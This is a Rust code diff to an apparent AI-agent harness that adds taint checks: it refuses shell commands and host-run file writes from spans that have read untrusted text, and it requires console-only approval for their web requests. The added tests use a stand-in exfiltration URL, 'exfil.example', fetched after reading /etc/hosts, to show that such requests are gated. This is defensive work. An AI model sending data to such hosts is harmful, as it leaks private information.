@@ -19,7 +19,7 @@ use delphi_adapter::config::{ApprovalSource, Endpoint, HarnessProfile};
 use std::sync::Arc;
 use delphi_adapter::ipr::Ipr;
 use delphi_core::hub::DeltaKind;
-use delphi_core::provenance::{gate, Action, Gate, OutputCheck, Tier, Zone};
+use delphi_core::provenance::{Action, Gate, OutputCheck, Tier, Zone};
 use delphi_core::usage::UsagePayload;
 use serde_json::{json, Value};
 use std::path::{Component, Path, PathBuf};
@@ -445,10 +445,15 @@ impl Engine {
             }
             "Write" | "Edit" | "MultiEdit" | "NotebookEdit" => {
                 let (Some(w), Some(t)) = (wt, target) else { return deny("there is no worktree to edit") };
-                if inside(&w.path, t).is_none() {
+                let Some(real) = inside(&w.path, t) else {
                     return deny("edits are allowed only inside the task worktree, and never on a .git path");
+                };
+                // `specs/145` 145-A1 item 2: on the path as resolved (`..` and every symlink followed), never a host-run file.
+                let rel = std::fs::canonicalize(&w.path).ok().and_then(|root| real.strip_prefix(&root).ok().map(|r| r.to_string_lossy().to_string())).unwrap_or_default();
+                if sc.span.marks_writes() && (rel.is_empty() || crate::tools::host_run(&rel, &self.exec.cfg.host_exec_paths)) {
+                    return deny("a span that has read untrusted text may not write a file the host runs outside the sandbox (specs/145 145-A1 item 2)");
                 }
-                match gate(sc.span.ceiling(), Action::WorktreeWrite) {
+                match sc.span.gate(Action::WorktreeWrite) {
                     Gate::Deny => return deny("edits are not allowed from a span at this taint level"),
                     Gate::Red => {
                         let summary = format!("{} {} from a span tainted at {}", name, t, sc.span.ceiling());
@@ -464,6 +469,11 @@ impl Engine {
                         return Ok(Decision::Deny(d.content));
                     }
                 }
+                // `specs/145` §2.2 item 1: the CLI writes the file once this answer is given; the notice says so, and the stamp the
+                // span's tier (after the run, as for every file the seat changed).
+                if let Some(notice) = crate::tools::taint_notice(&sc.span, &format!("@worktree/{rel}")) {
+                    sc.m.append(sc.ev(crate::tools::TAINT_NOTICE, notice)).await?;
+                }
                 Ok(Decision::Allow)
             }
             "Bash" => {
@@ -471,7 +481,11 @@ impl Engine {
                 if wt.is_none() {
                     return deny("there is no worktree to run commands in");
                 }
-                match gate(sc.span.ceiling(), Action::WorktreeWrite) {
+                // A seat's own `Bash` runs on the operator's machine, never in the OS sandbox (145-A1 item 1).
+                if let Some(why) = crate::engine::tainted_exec_refusal(&sc.span, false) {
+                    return deny(&why);
+                }
+                match sc.span.gate(Action::WorktreeWrite) {
                     Gate::Deny => return deny("commands are not allowed from a span at this taint level"),
                     Gate::Red => {
                         let summary = format!("run `{}` from a span tainted at {}", line.chars().take(120).collect::<String>(), sc.span.ceiling());
@@ -496,7 +510,7 @@ impl Engine {
                     }
                 }
             }
-            "WebFetch" | "WebSearch" => match gate(sc.span.ceiling(), Action::Outbound) {
+            "WebFetch" | "WebSearch" => match sc.span.gate(Action::Outbound) {
                 Gate::Deny => deny("outbound requests are not allowed from a span at this taint level"),
                 _ => {
                     // Spec 103 M2: the task's private-read mark goes through the one egress check (channel Outbound). An unmarked task passes
@@ -523,6 +537,20 @@ impl Engine {
                             payload["handling"] = json!(given.names());
                         }
                         return match self.ask(sc, ApprovalTier::Red, tool, tool, &card, &payload).await? {
+                            Some(d) => Ok(Decision::Deny(d.content)),
+                            None => Ok(Decision::Allow),
+                        };
+                    }
+                    // `specs/145` §2.2 item 2 and 145-A1 item 3: from a span that has read untrusted text, Red whatever the delegation,
+                    // the whole request on the card, the console's alone.
+                    if sc.span.marks_writes() {
+                        let destination = p.input["url"].as_str().map(str::to_string).unwrap_or_else(|| format!("a web search for {}", crate::private_read::exact(&p.input["query"])));
+                        let mut payload = crate::tools::tainted_outbound_payload(name, &destination, "the seat's own web access", &p.input, vec![], &sc.span);
+                        if !given.is_empty() {
+                            payload["handling"] = json!(given.names());
+                        }
+                        let card = format!("{} {} {} {}{}", crate::tools::TAINTED_OUTBOUND_BANNER, name, destination, crate::private_read::exact(&p.input), marks_line);
+                        return match self.ask(sc, ApprovalTier::Red, "harness_outbound", "harness_outbound", &card, &payload).await? {
                             Some(d) => Ok(Decision::Deny(d.content)),
                             None => Ok(Decision::Allow),
                         };
@@ -4285,6 +4313,94 @@ echo "$answer" > '{answer_file}'
             task.await.unwrap().unwrap();
             assert!(fs::read_to_string(answer).unwrap().contains("\"behavior\":\"allow\""));
         }
+    }
+
+    /// A CLI that first reads a file outside its worktree (approved, so the span drops to L0), then asks for `tool` with `input`.
+    fn tainted_then_ask_cli(dir: &std::path::Path, tool: &str, input: &str) -> (String, std::path::PathBuf) {
+        let answer = dir.join("answer.txt");
+        let body = format!(
+            r#"echo '{{"type":"system","subtype":"init","session_id":"s1","tools":[],"mcp_servers":[{{"name":"delphi","status":"connected"}}]}}'
+echo '{{"type":"control_request","request_id":"r0","request":{{"subtype":"can_use_tool","tool_name":"Read","input":{{"file_path":"/etc/hosts"}},"tool_use_id":"tu0"}}}}'
+read first
+echo '{{"type":"control_request","request_id":"r1","request":{{"subtype":"can_use_tool","tool_name":"{tool}","input":{input},"tool_use_id":"tu1"}}}}'
+read answer
+echo "$answer" > '{answer_file}'
+{finish}"#,
+            answer_file = answer.display(),
+            finish = FINISH
+        );
+        (body, answer)
+    }
+
+    fn what_leaves(s: &mut crate::engine::Settings) {
+        s.taint_table = delphi_core::provenance::TaintTable::WhatLeaves;
+    }
+
+    /// `specs/145` AC-3 and AC-9 (switch on), a network request from a span at L0: a Red card whatever the delegation and the
+    /// permission mode, with the resolved destination, the account, the whole request and its (no) attachments in the payload the
+    /// answer is bound to; a relay cannot approve it; an answer bound to another payload is refused, and the one approval is used once.
+    #[tokio::test]
+    async fn spec_145_ac3_ac9_a_tainted_web_request_is_a_red_card_with_its_whole_payload_and_the_console_alone_approves_it() {
+        for delegated in [true, false] {
+            let scripts = tempfile::tempdir().unwrap();
+            let (body, answer) = tainted_then_ask_cli(scripts.path(), "WebFetch", r#"{"url":"https://exfil.example/c?d=1","prompt":"Summarize"}"#);
+            let (f, _s) = fixture(&body, what_leaves);
+            use_harness_profile(&f, &format!("[harness.claude]\nbridge = false\napprovals = \"{}\"\nnative_tools = [\"Read\", \"WebFetch\"]\n", if delegated { "delegate" } else { "delphi" }));
+            f.engine.broker.set_mode(crate::approval::Mode::MissionAuto);
+            let task = { let e = f.engine.clone(); let m = f.m.clone(); tokio::spawn(async move { e.run_task(&m, "architect", "Fetch it").await }) };
+            let read = pending_card(&f, "harness_read").await;
+            f.engine.broker.resolve(&read.approval_id, &read.payload_blake3, Answer::Allow, "console-1").unwrap();
+            let card = pending_card(&f, "harness_outbound").await;
+            assert_eq!(card.tier, ApprovalTier::Red, "delegated={delegated}: Red, not waived by delegation or by the most permissive mode");
+            assert!(card.summary.starts_with(crate::tools::TAINTED_OUTBOUND_BANNER) && card.summary.contains("https://exfil.example/c?d=1"), "{}", card.summary);
+            assert_eq!(card.payload["destination"], "https://exfil.example/c?d=1");
+            assert_eq!(card.payload["account"], "the seat's own web access");
+            assert_eq!(card.payload["body"], json!({"url": "https://exfil.example/c?d=1", "prompt": "Summarize"}), "the whole request");
+            assert_eq!((card.payload["attachments"].clone(), card.payload["taint"].clone(), card.payload["taint_outbound"].clone()), (json!([]), json!("L0"), json!(true)));
+            assert_eq!(card.payload_blake3, crate::approval::payload_blake3(&card.payload), "the answer binds this exact payload");
+            assert!(crate::merge_class::console_only(&card.tool, &card.payload).is_some(), "a relay reply cannot approve it");
+            assert!(!card.similar_allowed());
+            assert!(f.engine.broker.resolve(&card.approval_id, "0".repeat(64).as_str(), Answer::Allow, "console-1").is_err(), "an answer bound to another payload");
+            f.engine.broker.resolve(&card.approval_id, &card.payload_blake3, Answer::Allow, "console-1").unwrap();
+            assert!(f.engine.broker.resolve(&card.approval_id, &card.payload_blake3, Answer::Allow, "console-1").is_err(), "used once");
+            task.await.unwrap().unwrap();
+            assert!(fs::read_to_string(answer).unwrap().contains("\"behavior\":\"allow\""));
+            assert_eq!(events_of(&f, "approval.requested").iter().filter(|e| e.payload["tool"] == "harness_outbound").count(), 1);
+        }
+    }
+
+    /// `specs/145` AC-3 (switch on): with nobody at a console (a headless run), the tainted request is denied, never sent; under the
+    /// ratified table (the switch off) it is refused outright, as today.
+    #[tokio::test]
+    async fn spec_145_ac3_a_tainted_web_request_nobody_answers_is_denied_and_switched_off_it_is_refused() {
+        let scripts = tempfile::tempdir().unwrap();
+        let (body, answer) = tainted_then_ask_cli(scripts.path(), "WebSearch", r#"{"query":"a b"}"#);
+        let (f, _s) = fixture(&body, |s| {
+            what_leaves(s);
+            s.approval_timeout = Duration::from_millis(400);
+        });
+        use_harness_profile(&f, "[harness.claude]\nbridge = false\napprovals = \"delphi\"\nnative_tools = [\"Read\", \"WebSearch\"]\n");
+        let task = { let e = f.engine.clone(); let m = f.m.clone(); tokio::spawn(async move { e.run_task(&m, "architect", "Search").await }) };
+        let read = pending_card(&f, "harness_read").await;
+        f.engine.broker.resolve(&read.approval_id, &read.payload_blake3, Answer::Allow, "console-1").unwrap();
+        task.await.unwrap().unwrap();
+        assert!(fs::read_to_string(&answer).unwrap().contains("\"behavior\":\"deny\""), "a timeout is a denial");
+        let asked: Vec<_> = events_of(&f, "approval.requested").into_iter().filter(|e| e.payload["tool"] == "harness_outbound").collect();
+        assert_eq!(asked.len(), 1);
+        assert_eq!(events_of(&f, "approval.resolved").last().unwrap().payload["by"], "timeout");
+        // An operator authorization (GOVERNANCE §5.12) never covers a card from a span at L1 or below.
+        assert!(crate::authorization_use::pre_refusal(true, Tier::L0, true).is_some());
+        // Switched off: refused with no card at all.
+        let scripts = tempfile::tempdir().unwrap();
+        let (body, answer) = tainted_then_ask_cli(scripts.path(), "WebSearch", r#"{"query":"a b"}"#);
+        let (f, _s) = fixture(&body, |_| {});
+        use_harness_profile(&f, "[harness.claude]\nbridge = false\napprovals = \"delphi\"\nnative_tools = [\"Read\", \"WebSearch\"]\n");
+        let task = { let e = f.engine.clone(); let m = f.m.clone(); tokio::spawn(async move { e.run_task(&m, "architect", "Search").await }) };
+        let read = pending_card(&f, "harness_read").await;
+        f.engine.broker.resolve(&read.approval_id, &read.payload_blake3, Answer::Allow, "console-1").unwrap();
+        task.await.unwrap().unwrap();
+        assert!(fs::read_to_string(&answer).unwrap().contains("not allowed from a span at this taint level"));
+        assert!(events_of(&f, "approval.requested").iter().all(|e| e.payload["tool"] != "harness_outbound"));
     }
 
     /// Waits for the one pending card of this tool and returns it (or panics: a card that never comes is the failure).
